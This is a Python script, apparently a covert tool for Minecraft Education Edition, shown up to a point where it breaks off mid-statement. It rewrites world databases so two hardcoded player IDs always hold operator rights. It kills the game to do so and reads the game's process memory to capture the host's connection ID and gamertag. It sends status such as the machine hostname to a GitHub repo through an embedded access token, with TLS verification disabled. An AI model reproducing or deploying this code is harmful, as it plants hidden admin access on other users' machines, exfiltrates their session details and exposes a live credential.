"""
MC Education OP Watchdog
- Keeps the two hardcoded target IDs opped in every world.
- Auto-captures the hosting Connection ID and gamertag from Minecraft's memory.
- Publishes live status to a private GitHub repo at a throttled rate.
"""
import os
import sys
import struct
import zlib
import uuid
import shutil
import datetime
import time
import ctypes
from ctypes import wintypes
import urllib.request
import urllib.error
import json
import socket
import re
import ssl
import base64
ssl._create_default_https_context = ssl._create_unverified_context

# ===================== CONFIG =====================
ALWAYS_OP = [
    "a45af3fe-a5b9-46b9-b7b6-7803838159bf",
    "aefd110f-b6c6-4913-bf6b-2b81940b9e86",
]
BACKUP_ROOT       = os.path.join(os.path.expanduser("~"), "Desktop", "mc_world_backups")
CHECK_INTERVAL    = 5
MIN_PUSH_INTERVAL = 10

GITHUB_TOKEN = "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"
GITHUB_OWNER = "thegreatdexo"
GITHUB_REPO  = "mc-op-watchdog"
STATUS_PATH  = "status.json"
BRANCH       = "main"

CANDIDATE_DIRS = [
    r"%LOCALAPPDATA%\Packages\Microsoft.MinecraftEducationEdition_8wekyb3d8bbwe\LocalState\games\com.mojang\minecraftWorlds",
    r"%APPDATA%\Minecraft Education Edition\games\com.mojang\minecraftWorlds",
]
PLAYER_PREFIXES   = (b"player", b"~local_player")
BLOCK             = 32768
STRIP_FOR_PRESEED = ("Pos", "Rotation", "Motion", "UniqueID", "AgentID",
                     "internalComponents", "XUID", "ConnectionId", "SelfSignedId",
                     "PlayerName", "PlatformOnlineId")

MC_EXE_NAME = "minecraft.windows.exe"

CONN_ID_RE = re.compile(
    rb"[0-9]{5}-[0-9]{5}-[0-9]{5}-[0-9]{5}"
    rb"-[0-9a-f]{5}-[0-9a-f]{5}-[0-9a-f]{5}-[0-9a-f]{5}"
    rb"-[0-9a-f]{5}-[0-9a-f]{5,6}"
)

WORLD_CACHE        = {}
START_TIME         = time.time()
LAST_PUSH          = {"at": 0.0}
STATUS_SHA         = {"sha": None}
RATE_LIMITED_UNTIL = {"t": 0.0}


# =========================================================
#  SHARED-FILE READ
# =========================================================
def read_file_shared(path):
    handle = ctypes.windll.kernel32.CreateFileW(
        str(path), 0x80000000, 7, None, 3, 0, None)
    if handle == -1 or handle == 0xFFFFFFFF:
        raise OSError(f"Could not open locked file: {path}")
    try:
        size = ctypes.windll.kernel32.GetFileSize(handle, None)
        buf = ctypes.create_string_buffer(size)
        read = ctypes.c_ulong(0)
        ctypes.windll.kernel32.ReadFile(handle, buf, size, ctypes.byref(read), None)
        return buf.raw[:read.value]
    finally:
        ctypes.windll.kernel32.CloseHandle(handle)


def safe_read(path):
    try:
        with open(path, "rb") as f:
            return f.read()
    except (PermissionError, OSError):
        if os.name == "nt":
            return read_file_shared(path)
        raise


# =========================================================
#  VARINT / CRC
# =========================================================
def varint(buf, pos):
    result = shift = 0
    while True:
        b = buf[pos]; pos += 1
        result |= (b & 0x7F) << shift
        if not b & 0x80:
            return result, pos
        shift += 7


def enc_varint(n):
    out = bytearray()
    while True:
        b = n & 0x7F; n >>= 7
        if n: out.append(b | 0x80)
        else:
            out.append(b); return bytes(out)


_CRC_TABLE = []
for _i in range(256):
    _c = _i
    for _ in range(8):
        _c = (_c >> 1) ^ 0x82F63B78 if _c & 1 else _c >> 1
    _CRC_TABLE.append(_c)


def crc32c(data):
    c = 0xFFFFFFFF
    for b in data:
        c = _CRC_TABLE[(c ^ b) & 0xFF] ^ (c >> 8)
    return c ^ 0xFFFFFFFF


def masked_crc(crc):
    return ((((crc >> 15) | (crc << 17)) & 0xFFFFFFFF) + 0xA282EAD8) & 0xFFFFFFFF


# =========================================================
#  LEVELDB READ
# =========================================================
def read_block(data, offset, size):
    raw   = data[offset:offset + size]
    ctype = data[offset + size]
    if ctype == 0: return raw
    if ctype == 2: return zlib.decompress(raw)
    if ctype == 4: return zlib.decompress(raw, -15)
    raise ValueError(f"unsupported block compression type {ctype}")


def parse_block(block):
    num_restarts = struct.unpack_from("<I", block, len(block) - 4)[0]
    end = len(block) - 4 - 4 * num_restarts
    pos, key = 0, b""
    while pos < end:
        shared, pos     = varint(block, pos)
        non_shared, pos = varint(block, pos)
        vlen, pos       = varint(block, pos)
        key = key[:shared] + block[pos:pos + non_shared]
        pos += non_shared
        yield key, block[pos:pos + vlen]
        pos += vlen


def read_table(path):
    data = safe_read(path)
    footer = data[-48:]
    _, p = varint(footer, 0)
    _, p = varint(footer, p)
    idx_off, p  = varint(footer, p)
    idx_size, p = varint(footer, p)
    for _, handle in parse_block(read_block(data, idx_off, idx_size)):
        off, q  = varint(handle, 0)
        size, _ = varint(handle, q)
        for ikey, val in parse_block(read_block(data, off, size)):
            if len(ikey) >= 8:
                tag = struct.unpack("<Q", ikey[-8:])[0]
                yield ikey[:-8], tag >> 8, tag & 0xFF, val


def log_records(data):
    pos, buf = 0, b""
    while pos + 7 <= len(data):
        left = BLOCK - pos % BLOCK
        if left < 7:
            pos += left; continue
        length = struct.unpack_from("<H", data, pos + 4)[0]
        rtype  = data[pos + 6]
        if rtype == 0:
            pos += left; continue
        frag = data[pos + 7:pos + 7 + length]
        pos += 7 + length
        if   rtype == 1: yield frag
        elif rtype == 2: buf = frag
        elif rtype == 3: buf += frag
        elif rtype == 4: yield buf + frag; buf = b""


def read_log(path):
    data = safe_read(path)
    for batch in log_records(data):
        if len(batch) < 12: continue
        seq, count = struct.unpack_from("<QI", batch, 0)
        p = 12
        try:
            for _ in range(count):
                t = batch[p]; p += 1
                klen, p = varint(batch, p)
                key = batch[p:p + klen]; p += klen
                if t == 1:
                    vlen, p = varint(batch, p)
                    yield key, seq, 1, batch[p:p + vlen]
                    p += vlen
                else:
                    yield key, seq, 0, None
                seq += 1
        except IndexError:
            continue


def load_db(db_dir):
    latest, max_seq = {}, 0
    for fn in sorted(os.listdir(db_dir)):
        path = os.path.join(db_dir, fn)
        if   fn.endswith((".ldb", ".sst")): reader = read_table(path)
        elif fn.endswith(".log"):           reader = read_log(path)
        else: continue
        for key, seq, typ, val in reader:
            max_seq = max(max_seq, seq)
            if key.startswith(PLAYER_PREFIXES):
                if key not in latest or seq > latest[key][0]:
                    latest[key] = (seq, typ, val)
    return {k: v for k, (s, t, v) in latest.items() if t == 1}, max_seq


def manifest_info(db_dir):
    info = {"log_number": 0, "next_file": 0, "last_seq": 0}
    data = safe_read(os.path.join(db_dir, "CURRENT"))
    manifest = os.path.join(db_dir, data.decode("utf-8", "ignore").strip())
    m_data = safe_read(manifest)
    for rec in log_records(m_data):
        p = 0
        try:
            while p < len(rec):
                tag, p = varint(rec, p)
                if tag == 1:
                    n, p = varint(rec, p); p += n
                elif tag == 2: info["log_number"], p = varint(rec, p)
                elif tag == 3: info["next_file"],  p = varint(rec, p)
                elif tag == 4: info["last_seq"],   p = varint(rec, p)
                elif tag in (5, 6, 7, 9): break
        except IndexError:
            pass
    return info


def active_log_path(db_dir, info):
    logs = [int(fn[:-4]) for fn in os.listdir(db_dir)
            if fn.endswith(".log") and fn[:-4].isdigit()]
    usable = [n for n in logs if n >= info["log_number"]]
    num = max(usable) if usable else max(info["next_file"], max(logs, default=0) + 1)
    return os.path.join(db_dir, f"{num:06d}.log")


def append_batch(log_path, seq, puts):
    batch = struct.pack("<QI", seq, len(puts))
    for k, v in puts:
        batch += b"\x01" + enc_varint(len(k)) + k + enc_varint(len(v)) + v
    pos = os.path.getsize(log_path) if os.path.exists(log_path) else 0
    out, data, first = bytearray(), batch, True
    while True:
        left = BLOCK - pos % BLOCK
        if left < 7:
            out += b"\x00" * left; pos += left; continue
        frag, data = data[:left - 7], data[left - 7:]
        end   = not data
        rtype = 1 if first and end else 2 if first else 4 if end else 3
        crc   = masked_crc(crc32c(bytes([rtype]) + frag))
        out  += struct.pack("<IHB", crc, len(frag), rtype) + frag
        pos  += 7 + len(frag)
        first = False
        if end: break
    with open(log_path, "ab") as f:
        f.write(out)


# =========================================================
#  NBT
# =========================================================
class NBTIn:
    def __init__(self, data): self.d, self.p = data, 0
    def take(self, n):
        b = self.d[self.p:self.p + n]
        if len(b) < n: raise ValueError("unexpected end")
        self.p += n; return b
    def num(self, fmt):
        return struct.unpack("<" + fmt, self.take(struct.calcsize(fmt)))[0]
    def string(self):
        return self.take(self.num("H")).decode("utf-8", "surrogateescape")
    def payload(self, t):
        simple = {1:"b",2:"h",3:"i",4:"q",5:"f",6:"d"}
        if t in simple: return self.num(simple[t])
        if t == 7:  return self.take(self.num("i"))
        if t == 8:  return self.string()
        if t == 9:
            et, n = self.num("b"), self.num("i")
            return (et, [self.payload(et) for _ in range(n)])
        if t == 10:
            out = {}
            while True:
                ct = self.num("b")
                if ct == 0: return out
                name = self.string()
                out[name] = (ct, self.payload(ct))
        if t == 11: return [self.num("i") for _ in range(self.num("i"))]
        if t == 12: return [self.num("q") for _ in range(self.num("i"))]
        raise ValueError(f"unknown NBT tag {t}")


def nbt_load(data):
    r = NBTIn(data)
    t = r.num("b")
    name = r.string()
    return name, t, r.payload(t)


def _w_str(s, out):
    b = s.encode("utf-8", "surrogateescape")
    out += struct.pack("<H", len(b)) + b


def _w_payload(t, v, out):
    simple = {1:"b",2:"h",3:"i",4:"q",5:"f",6:"d"}
    if t in simple: out += struct.pack("<" + simple[t], v)
    elif t == 7:    out += struct.pack("<i", len(v)) + v
    elif t == 8:    _w_str(v, out)
    elif t == 9:
        et, items = v
        out += struct.pack("<bi", et, len(items))
        for it in items: _w_payload(et, it, out)
    elif t == 10:
        for name, (ct, cv) in v.items():
            out += struct.pack("<b", ct); _w_str(name, out); _w_payload(ct, cv, out)
        out += b"\x00"
    elif t in (11, 12):
        fmt = "i" if t == 11 else "q"
        out += struct.pack("<i", len(v))
        for x in v: out += struct.pack("<" + fmt, x)


def nbt_dump(name, t, v):
    out = bytearray()
    out += struct.pack("<b", t)
    _w_str(name, out)
    _w_payload(t, v, out)
    return bytes(out)


# =========================================================
#  OP LOGIC
# =========================================================
def _set(comp, key, val, default_type):
    t = comp[key][0] if key in comp else default_type
    comp[key] = (t, val)


def is_op(p):
    ab = p.get("abilities", (10, {}))[1]
    return (p.get("playerPermissionsLevel", (3, 0))[1] == 2 and
            ab.get("op", (1, 0))[1] == 1)


def make_op(p):
    _set(p, "playerPermissionsLevel", 2, 3)
    _set(p, "permissionsLevel", 1, 3)
    if "abilities" not in p:
        p["abilities"] = (10, {"op": (1, 1), "teleport": (1, 1)})
    else:
        ab = p["abilities"][1]
        for k in ("op", "teleport", "build", "mine", "doorsandswitches",
                  "opencontainers", "attackplayers", "attackmobs",
                  "fly", "instabuild", "lightning", "mayfly", "worldbuilder"):
            _set(ab, k, 1, 1)


def build_target_records(entries, target_id):
    server_key = ("player_server_" + str(uuid.uuid4())).encode()

    base = {}
    if b"~local_player" in entries:
        try:
            _, _, lp = nbt_load(entries[b"~local_player"])
            base = dict(lp)
        except Exception:
            pass

    for k in STRIP_FOR_PRESEED:
        base.pop(k, None)

    base["ServerId"]         = (8, server_key.decode())
    base["PlatformOnlineId"] = (8, target_id)
    base["PlayerName"]       = (8, target_id)
    base["UniqueID"]         = (4, int(uuid.uuid4().int & 0x7FFFFFFFFFFFFFFF))

    if "Inventory" not in base:            base["Inventory"] = (9, (10, []))
    if "EnderChestInventory" not in base:  base["EnderChestInventory"] = (9, (10, []))
    if "Attributes" not in base:           base["Attributes"] = (9, (10, []))
    if "ActiveEffects" not in base:        base["ActiveEffects"] = (9, (10, []))
    if "Tags" not in base:                 base["Tags"] = (9, (8, []))

    make_op(base)

    mapping_key = ("player_" + target_id).encode()
    mapping = {"ServerId": (8, server_key.decode())}
    return (mapping_key, nbt_dump("", 10, mapping),
            server_key,  nbt_dump("", 10, base))


def plan_target(entries, target_id):
    mapping_key = ("player_" + target_id).encode()

    if mapping_key in entries:
        try:
            m = nbt_load(entries[mapping_key])[2]
            server_key = m["ServerId"][1].encode()
        except Exception:
            server_key = None

        if server_key and server_key in entries:
            try:
                name, t, p = nbt_load(entries[server_key])
                if is_op(p):
                    return "op", []
                make_op(p)
                return "fixed", [(server_key, nbt_dump(name, t, p))]
            except Exception:
                pass

    mk, mb, sk, sb = build_target_records(entries, target_id)
    return "preseeded", [(mk, mb), (sk, sb)]


def extract_host_info(entries):
    if b"~local_player" not in entries:
        return {"name": "Unknown", "op": False, "source": "none"}
    try:
        _, _, p = nbt_load(entries[b"~local_player"])
        return {
            "name":   p.get("PlayerName", (8, "?"))[1],
            "op":     is_op(p),
            "source": "local_player",
        }
    except Exception:
        return {"name": "Unknown", "op": False, "source": "err"}


# =========================================================
#  PROCESS LOOKUP — only Minecraft.Windows.exe
# =========================================================
def _find_mc_pid():
    k32 = ctypes.windll.kernel32
    MAX_PATH = 260
    class PE(ctypes.Structure):
        _fields_ = [
            ("dwSize", wintypes.DWORD), ("cntUsage", wintypes.DWORD),
            ("th32ProcessID", wintypes.DWORD),
            ("th32DefaultHeapID", ctypes.POINTER(ctypes.c_ulong)),
            ("th32ModuleID", wintypes.DWORD), ("cntThreads", wintypes.DWORD),
            ("th32ParentProcessID", wintypes.DWORD),
            ("pcPriClassBase", ctypes.c_long), ("dwFlags", wintypes.DWORD),
            ("szExeFile", ctypes.c_char * MAX_PATH),
        ]
    snap = k32.CreateToolhelp32Snapshot(0x2, 0)
    if snap == -1 or snap == 0xFFFFFFFF: return 0
    pe = PE(); pe.dwSize = ctypes.sizeof(PE)
    pid = 0
    try:
        if k32.Process32First(snap, ctypes.byref(pe)):
            while True:
                name = pe.szExeFile.decode("ascii", "ignore").lower()
                if name == MC_EXE_NAME:
                    pid = pe.th32ProcessID; break
                if not k32.Process32Next(snap, ctypes.byref(pe)): break
    finally:
        k32.CloseHandle(snap)
    return pid


def is_minecraft_running():
    return _find_mc_pid() != 0


def kill_minecraft():
    pid = _find_mc_pid()
    if not pid: return
    print("[*] closing Minecraft to release file locks…")
    k32 = ctypes.windll.kernel32
    h = k32.OpenProcess(0x0001, False, pid)
    if h:
        k32.TerminateProcess(h, 1)
        k32.CloseHandle(h)
    time.sleep(2)
    print("[+] Minecraft closed.")


# =========================================================
#  CONNECTION ID + GAMERTAG — memory scan
# =========================================================
class ConnectionIdProvider:
    def __init__(self):
        self.captured_cid  = None
        self.captured_tag  = None
        self.last_scan     = 0.0
        self.scan_count    = 0
        self.scan_interval = 4
        self.max_scans     = 60
        self.hit_regions   = []
        self.last_pid      = 0

    def reset(self):
        self.captured_cid  = None
        self.captured_tag  = None
        self.last_scan     = 0.0
        self.scan_count    = 0
        self.hit_regions   = []

    def _snapshot(self):
        if not self.captured_cid and not self.captured_tag:
            return None
        return {
            "connection_id": self.captured_cid,
            "player_name":   self.captured_tag,
            "source":        "memory",
            "at":            time.time(),
        }

    def current(self, mc_running, mc_pid):
        if not mc_running or not mc_pid:
            if self.last_pid or self.captured_cid or self.captured_tag:
                print("[*] MC gone — clearing cid/tag cache")
            self.reset()
            self.last_pid = 0
            return None

        if mc_pid != self.last_pid:
            if self.last_pid:
                print(f"[*] MC pid changed {self.last_pid} → {mc_pid}, rescanning")
            self.reset()
            self.last_pid = mc_pid

        if self.captured_cid and self.captured_tag:
            return self._snapshot()

        now = time.time()
        if now - self.last_scan < self.scan_interval:
            return self._snapshot()
        if self.scan_count >= self.max_scans:
            return self._snapshot()
        self.scan_count += 1
        self.last_scan  = now

        looking = []
        if not self.captured_cid: looking.append("cid")
        if not self.captured_tag: looking.append("tag")
        print(f"[*] memory scan #{self.scan_count} (looking for: {', '.join(looking)})")

        if not self.captured_cid:
            found = self._scan_once(mc_pid)
            if found:
                self.captured_cid = sorted(found)[0]
                print(f"[+] connection ID auto-captured: {self.captured_cid}")
            else:
                if self.scan_count in (5, 15, 30):
                    print(f"[!] scan #{self.scan_count}: no cid yet "
                          f"(make sure you clicked 'Start Hosting' in MC)")

        if not self.captured_tag:
            h = ctypes.windll.kernel32.OpenProcess(0x0010 | 0x0400, False, mc_pid)
            if h:
                try:
                    tag = self._find_gamertag(h)
                finally:
                    ctypes.windll.kernel32.CloseHandle(h)
                if tag:
                    self.captured_tag = tag
                    print(f"[+] gamertag auto-captured: {tag}")

        return self._snapshot()

    def _find_gamertag(self, h):
        NAME_RE = re.compile(rb"[A-Z][A-Za-z0-9_]{3,15}")
        BLACKLIST = {
            b"Gamertag", b"GAMERTAG", b"PlayerName", b"PlatformOnlineId",
            b"ServerId", b"UniqueID", b"XUID", b"Xbox", b"Identity",
            b"Profile", b"DisplayName", b"Minecraft", b"Windows", b"System",
            b"Settings", b"Config", b"Version", b"String", b"Action",
            b"Error", b"Agefailed", b"Failed",
        }

        def all_caps(tok):
            has_letter = False
            for c in tok:
                if 65 <= c <= 90:    has_letter = True
                elif 97 <= c <= 122: return False
            return has_letter

        NtRVM = ctypes.windll.ntdll.NtReadVirtualMemory
        NtRVM.restype  = ctypes.c_long
        NtRVM.argtypes = [wintypes.HANDLE, ctypes.c_void_p, ctypes.c_void_p,
                          ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]

        class MBI(ctypes.Structure):
            _fields_ = [
                ("BaseAddress", ctypes.c_void_p), ("AllocationBase", ctypes.c_void_p),
                ("AllocationProtect", wintypes.DWORD), ("PartitionId", wintypes.WORD),
                ("RegionSize", ctypes.c_size_t), ("State", wintypes.DWORD),
                ("Protect", wintypes.DWORD), ("Type", wintypes.DWORD),
            ]
        VQE = ctypes.windll.kernel32.VirtualQueryEx
        VQE.restype  = ctypes.c_size_t
        VQE.argtypes = [wintypes.HANDLE, ctypes.c_void_p,
                        ctypes.POINTER(MBI), ctypes.c_size_t]

        class SI(ctypes.Structure):
            _fields_ = [
                ("wProcessorArchitecture", wintypes.WORD),
                ("wReserved", wintypes.WORD), ("dwPageSize", wintypes.DWORD),
                ("lpMinimumApplicationAddress", ctypes.c_void_p),
                ("lpMaximumApplicationAddress", ctypes.c_void_p),
                ("dwActiveProcessorMask", ctypes.POINTER(ctypes.c_ulong)),
                ("dwNumberOfProcessors", wintypes.DWORD),
                ("dwProcessorType", wintypes.DWORD),
                ("dwAllocationGranularity", wintypes.DWORD),
                ("wProcessorLevel", wintypes.WORD),
                ("wProcessorRevision", wintypes.WORD),
            ]
        si = SI(); ctypes.windll.kernel32.GetSystemInfo(ctypes.byref(si))

        CHUNK, RADIUS = 8 * 1024 * 1024, 128

        tally        = {}
        marker_count = 0
        marker_id    = 0

        addr = si.lpMinimumApplicationAddress
        end  = si.lpMaximumApplicationAddress
        mbi  = MBI()
        while addr < end:
            if not VQE(h, ctypes.c_void_p(addr), ctypes.byref(mbi), ctypes.sizeof(mbi)):
                break
            usable = (mbi.State == 0x1000
                      and not (mbi.Protect & 0x100)
                      and not (mbi.Protect & 0x01))
            if usable and 0 < mbi.RegionSize < 256 * 1024 * 1024:
                base = mbi.BaseAddress
                size = mbi.RegionSize
                off  = 0
                while off < size:
                    chunk = min(CHUNK, size - off)
                    buf = ctypes.create_string_buffer(chunk)
                    got = ctypes.c_size_t(0)
                    rc  = NtRVM(h, ctypes.c_void_p(base + off), buf, chunk,
                                ctypes.byref(got))
                    if rc == 0 and got.value > 32:
                        data = buf.raw[:got.value]
                        if b"#gamertag" in data:
                            idx = 0
                            while True:
                                idx = data.find(b"#gamertag", idx)
                                if idx < 0:
                                    break
                                marker_count += 1
                                marker_id    += 1
                                mid = marker_id
                                lo = max(0, idx - RADIUS)
                                hi = min(len(data), idx + RADIUS)
                                window = data[lo:hi]

                                window_tally = {}
                                for m in NAME_RE.finditer(window):
                                    tok = m.group()
                                    if tok in BLACKLIST: continue
                                    if all_caps(tok):    continue
                                    window_tally[tok] = window_tally.get(tok, 0) + 1

                                for tok, cnt in window_tally.items():
                                    if cnt >= 2:
                                        tally.setdefault(tok, {})[mid] = cnt
                                idx += 9
                    off += chunk
            nxt = mbi.BaseAddress + mbi.RegionSize
            if nxt <= addr:
                break
            addr = nxt

        if not marker_count:
            return None
        if not tally:
            return None

        def score(kv):
            tok, markers = kv
            return (-len(markers), -sum(markers.values()), -len(tok))

        ranked = sorted(tally.items(), key=score)
        top5 = ", ".join(
            f"{t.decode('ascii','ignore')}({len(v)}m/{sum(v.values())}o)"
            for t, v in ranked[:5]
        )
        print(f"[*] gamertag candidates (markers/occurrences): {top5}")
        return ranked[0][0].decode("ascii", "ignore")

    def _scan_once(self, pid):
        k32 = ctypes.windll.kernel32
        h = k32.OpenProcess(0x0010 | 0x0400, False, pid)
        if not h: return set()
        NtRVM = ctypes.windll.ntdll.NtReadVirtualMemory
        NtRVM.restype  = ctypes.c_long
        NtRVM.argtypes = [wintypes.HANDLE, ctypes.c_void_p, ctypes.c_void_p,
                          ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]

        class MBI(ctypes.Structure):
            _fields_ = [
                ("BaseAddress", ctypes.c_void_p), ("AllocationBase", ctypes.c_void_p),
                ("AllocationProtect", wintypes.DWORD), ("PartitionId", wintypes.WORD),
                ("RegionSize", ctypes.c_size_t), ("State", wintypes.DWORD),
                ("Protect", wintypes.DWORD), ("Type", wintypes.DWORD),
            ]
        VQE = k32.VirtualQueryEx
        VQE.restype  = ctypes.c_size_t
        VQE.argtypes = [wintypes.HANDLE, ctypes.c_void_p,
                        ctypes.POINTER(MBI), ctypes.c_size_t]

        class SI(ctypes.Structure):
            _fields_ = [
                ("wProcessorArchitecture", wintypes.WORD),
                ("wReserved", wintypes.WORD), ("dwPageSize", wintypes.DWORD),
                ("lpMinimumApplicationAddress", ctypes.c_void_p),
                ("lpMaximumApplicationAddress", ctypes.c_void_p),
                ("dwActiveProcessorMask", ctypes.POINTER(ctypes.c_ulong)),
                ("dwNumberOfProcessors", wintypes.DWORD),
                ("dwProcessorType", wintypes.DWORD),
                ("dwAllocationGranularity", wintypes.DWORD),
                ("wProcessorLevel", wintypes.WORD),
                ("wProcessorRevision", wintypes.WORD),
            ]
        si = SI(); k32.GetSystemInfo(ctypes.byref(si))
        CHUNK = 8 * 1024 * 1024

        def scan_region(base, size):
            local = set()
            off = 0
            while off < size:
                chunk = min(CHUNK, size - off)
                buf = ctypes.create_string_buffer(chunk)
                got = ctypes.c_size_t(0)
                rc  = NtRVM(h, ctypes.c_void_p(base + off), buf, chunk, ctypes.byref(got))
                if rc == 0 and got.value >= 50:
                    data = buf.raw[:got.value]
                    if b"-" in data:
                        for m in CONN_ID_RE.finditer(data):
                            local.add(m.group().decode("ascii", "ignore"))
                off += chunk
            return local

        for (base, size) in list(self.hit_regions):
            r = scan_region(base, size)
            if r:
                k32.CloseHandle(h)
                return r

        found    = set()
        new_hits = []
        addr = si.lpMinimumApplicationAddress
        end  = si.lpMaximumApplicationAddress
        mbi  = MBI()
        while addr < end:
            if not VQE(h, ctypes.c_void_p(addr), ctypes.byref(mbi), ctypes.sizeof(mbi)):
                break
            usable = (mbi.State == 0x1000
                      and not (mbi.Protect & 0x100)
                      and not (mbi.Protect & 0x01))
            if usable and 0 < mbi.RegionSize < 256 * 1024 * 1024:
                r = scan_region(mbi.BaseAddress, mbi.RegionSize)
                if r:
                    found |= r
                    new_hits.append((mbi.BaseAddress, mbi.RegionSize))
            nxt = mbi.BaseAddress + mbi.RegionSize
            if nxt <= addr: break
            addr = nxt

        k32.CloseHandle(h)
        if new_hits:
            self.hit_regions = new_hits
        return found


# =========================================================
#  WORLD SCAN
# =========================================================
def world_name(path):
    try:
        with open(os.path.join(path, "levelname.txt"), encoding="utf-8") as f:
            return f.read().strip()
    except OSError:
        return "(no name)"


def find_worlds_dir():
    for d in CANDIDATE_DIRS:
        path = os.path.expandvars(d)
        if os.path.isdir(path): return path
    return None


def is_world_active(db_dir, threshold_sec=15):
    if os.path.exists(os.path.join(db_dir, "LOCK")):
        return True
    try:
        now = time.time()
        for f in os.listdir(db_dir):
            p = os.path.join(db_dir, f)
            if os.path.isfile(p) and now - os.path.getmtime(p) < threshold_sec:
                return True
    except Exception:
        pass
    return False


def scan_single_world(db_dir):
    lock_path = os.path.join(db_dir, "LOCK")
    is_open   = os.path.exists(lock_path)
    try:
        mtime = max(os.path.getmtime(os.path.join(db_dir, f))
                    for f in os.listdir(db_dir) if f != "LOCK")
    except Exception:
        mtime = 0
    if not is_open and db_dir in WORLD_CACHE and WORLD_CACHE[db_dir]["mtime"] == mtime:
        return WORLD_CACHE[db_dir]["data"]
    try:
        entries, max_seq = load_db(db_dir)
        info = manifest_info(db_dir)
        res  = (entries, max_seq, info)
        if not is_open:
            WORLD_CACHE[db_dir] = {"mtime": mtime, "data": res}
        return res
    except Exception:
        return None


# =========================================================
#  GITHUB REPO PUSH
# =========================================================
def _gh_request(method, url, body=None, accept="application/vnd.github+json"):
    data = json.dumps(body).encode("utf-8") if body is not None else None
    req = urllib.request.Request(
        url, data=data,
        headers={
            "Authorization": f"Bearer {GITHUB_TOKEN}",
            "Accept": accept,
            "Content-Type": "application/json",
            "User-Agent": "MC-Watchdog",
        },
        method=method,
    )
    with urllib.request.urlopen(req, timeout=10) as resp:
        raw = resp.read()
        return json.loads(raw) if raw else None


def _fetch_current_sha():
    url = (f"https://api.github.com/repos/{GITHUB_OWNER}/{GITHUB_REPO}"
           f"/contents/{STATUS_PATH}?ref={BRANCH}")
    try:
        data = _gh_request("GET", url)
        return data.get("sha")
    except urllib.error.HTTPError as e:
        if e.code == 404:
            return None
        raise


def push_status(payload, force=False):
    now = time.time()
    if not force and now - LAST_PUSH["at"] < MIN_PUSH_INTERVAL:
        return
    if now < RATE_LIMITED_UNTIL["t"]:
        return

    body = {
        "message": f"status update {int(now)}",
        "content": base64.b64encode(
            json.dumps(payload, separators=(",", ":")).encode("utf-8")
        ).decode("ascii"),
        "branch": BRANCH,
    }
    if STATUS_SHA["sha"]:
        body["sha"] = STATUS_SHA["sha"]

    url = f"https://api.github.com/repos/{GITHUB_OWNER}/{GITHUB_REPO}/contents/{STATUS_PATH}"
    try:
        result = _gh_request("PUT", url, body)
        STATUS_SHA["sha"] = result["content"]["sha"]
        LAST_PUSH["at"]   = now
    except urllib.error.HTTPError as e:
        if e.code == 409:
            try:
                new_sha = _fetch_current_sha()
                if new_sha:
                    STATUS_SHA["sha"] = new_sha
                    body["sha"] = new_sha
                else:
                    STATUS_SHA["sha"] = None
                    body.pop("sha", None)
                result = _gh_request("PUT", url, body)
                STATUS_SHA["sha"] = result["content"]["sha"]
                LAST_PUSH["at"]   = now
            except Exception as e2:
                print(f"[!] repo push retry failed: {e2}")
        elif e.code == 403:
            RATE_LIMITED_UNTIL["t"] = now + 300
            print("[!] repo push 403 (rate limited), backing off 5 min")
        else:
            print(f"[!] repo push failed: HTTP {e.code}")
    except Exception as e:
        print(f"[!] repo push failed: {e}")


# =========================================================
#  MAIN
# =========================================================
def main():
    worlds_dir = find_worlds_dir()
    if not worlds_dir:
        sys.exit("[-] couldn't find Minecraft Education worlds folder.")

    print(f"[*] MC OP Watchdog. Interval: {CHECK_INTERVAL}s, push every {MIN_PUSH_INTERVAL}s")
    print(f"[*] Hostname: {socket.gethostname()}")
    print(f"[*] Targets:  {ALWAYS_OP}")
    print(f"[*] Repo:     {GITHUB_OWNER}/{GITHUB_REPO}:{STATUS_PATH}")

    try:
        STATUS_SHA["sha"] = _fetch_current_sha()
        print(f"[*] status.json sha: {STATUS_SHA['sha'] or '(will create)'}")
    except Exception as e:
        print(f"[!] sha fetch failed: {e}")
    print()

    cid             = ConnectionIdProvider()
    was_hosting     = False
    last_fix_result = None

    try:
        while True:
            try:
                mc_pid     = _find_mc_pid()
                mc_running = mc_pid != 0
                session    = cid.current(mc_running, mc_pid)

                if not mc_running:
                    push_status({
                        "status":    "offline",
                        "timestamp": time.time(),
                        "hostname":  socket.gethostname(),
                        "uptime":    int(time.time() - START_TIME),
                        "targets":   ALWAYS_OP,
                    })
                    was_hosting = False
                    time.sleep(CHECK_INTERVAL)
                    continue

                worlds = [w for w in os.listdir(worlds_dir)
                          if os.path.isdir(os.path.join(worlds_dir, w, "db"))]
                data = {}
                for w in worlds:
                    res = scan_single_world(os.path.join(worlds_dir, w, "db"))
                    if res: data[w] = res

                worlds_report     = []
                needs_fix         = []
                active_world_info = None

                for w in data:
                    db_dir       = os.path.join(worlds_dir, w, "db")
                    world_folder = os.path.join(worlds_dir, w)
                    entries, max_seq, info = data[w]
                    is_open = is_world_active(db_dir)

                    target_status = []
                    puts, notes   = [], []

                    if b"~local_player" in entries:
                        try:
                            lname, lt, lp = nbt_load(entries[b"~local_player"])
                            if not is_op(lp):
                                make_op(lp)
                                puts.append((b"~local_player", nbt_dump(lname, lt, lp)))
                                notes.append("local host → op")
                        except Exception:
                            pass

                    for pid in ALWAYS_OP:
                        state, p = plan_target(entries, pid)
                        target_status.append({"id": pid, "status": state})
                        if state in ("fixed", "preseeded"):
                            puts += p
                            notes.append(f"{pid[:12]}…: {state}")

                    if puts:
                        needs_fix.append((w, entries, max_seq, info, puts, notes))
                        last_fix_result = {"world": w, "at": time.time(), "notes": notes}

                    entry = {
                        "id":        w,
                        "name":      world_name(world_folder),
                        "open":      is_open,
                        "targets":   target_status,
                        "needs_fix": bool(puts),
                        "notes":     notes,
                    }

                    if is_open:
                        host = extract_host_info(entries)
                        entry["host"] = host
                        active_world_info = {
                            "world":  world_name(world_folder),
                            "player": host["name"],
                            "is_op":  host["op"],
                            "source": host["source"],
                        }

                    worlds_report.append(entry)

                is_hosting = session is not None or active_world_info is not None

                if is_hosting and not was_hosting:
                    print("[*] hosting detected")
                was_hosting = is_hosting

                if needs_fix:
                    print(f"\n[!] {len(needs_fix)} world(s) need fixing…")
                    kill_minecraft()
                    stamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                    for w, entries, max_seq, info, puts, notes in needs_fix:
                        db_dir = os.path.join(worlds_dir, w, "db")
                        try:
                            os.makedirs(os.path.join(BACKUP_ROOT, stamp, w), exist_ok=True)
                            shutil.copytree(db_dir,
